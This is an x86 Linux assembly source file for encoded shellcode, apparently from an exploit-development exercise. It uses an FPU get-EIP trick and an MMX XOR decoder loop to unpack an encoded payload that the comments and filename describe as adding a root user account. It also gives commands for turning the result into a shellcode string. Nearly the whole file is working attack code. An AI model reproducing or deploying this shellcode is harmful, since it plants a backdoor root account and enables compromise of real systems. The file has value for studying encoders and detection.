; Compile with:
;    nasm -f elf32 fpuMMX_addRootUser.nasm -o fpuMMX_addRootUser.o
;    ld fpuMMX_addRootUser.o -o fpuMMX_addRootUser
; get shellcode and add to shellcode.c with:
;    for i in $(objdump -D fpuMMX_addRootUser | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
global _start
section .text
_start:
    fldz                   ; x87 FPU - Get EIP Technique
    fstenv [esp -0xc]      ; push EIP at fldz instr to stack
    pop edi                ; pop EIP fldz location to EDI 
    add edi, 0x28          ; set EDI to memory location of mmx_XOR
    movq mm3, qword [edi]  ; use instructions located here as the XOR decoder
    lea esi, [edi +8]      ; set ESI to payload location
    xor ecx, ecx           ; clear ECX
    inc ecx                ; inc ECX to 1
decode:
    movq mm5, qword [esi]  ; move 8 bytes of encoded payload to MM3
    pxor mm5, mm3          ; XOR MM5 with MM3
    movq qword [esi], mm5  ; overwrite 8 bytes of encoded payload with decoded
    add esi, 0x8           ; move ESI to the next 8 encoded bytes
    cmp ecx, 0xe           ; is payload decoded?
    je payload             ; if decoded, execute payload
    inc ecx                ; if not, decode next 8 bytes
    jmp short decode       ; jump to start of decode loop
mmx_XOR: db 0xcc,0xee,0xd9,0xee,0xcc,0xd9,0xd9,0xcc
; addAcct.nasm encoded with 'encoder.py'
; payload cannot contain: 0xcc,0xee,0xd9
payload: db \
        0x27,0xc9,0x87,0xdf,0x0c,0x89,0x54,0xd8,0xe8,0x11,\
        0xaf,0xc4,0x33,0xaf,0xff,0x41,0xc0,0xca,0x51,0xa8,\
        0xce,0x51,0x9f,0xf1,0x9c,0x63,0x87,0xed,0x9f,0x54,\
        0xc7,0x9f,0x45,0x25,0x8a,0x67,0x2d,0x69,0xd2,0x01,\
        0x4c,0x06,0x0d,0x11,0x33,0x26,0xf4,0xaf,0xef,0xc1,\
        0xbb,0x87,0xa2,0xf6,0xbc,0xaf,0xa4,0x81,0xf9,0x8d,\
        0xb8,0xb5,0xe3,0x82,0x82,0x99,0x83,0xd6,0x88,0xe8,\
        0x88,0xa6,0x9a,0x97,0xea,0xb7,0xf6,0xe9,0xe3,0xfc,\
        0xf6,0xd4,0xf6,0xd4,0xe3,0xbb,0xb0,0xa2,0xe3,0xc1,\
        0xaa,0x86,0xec,0xe7,0xe7,0xec,0xe3,0x8b,0xad,0x8d,\
        0xe3,0xa9,0xb8,0xbf,0xbf,0x99,0xbd
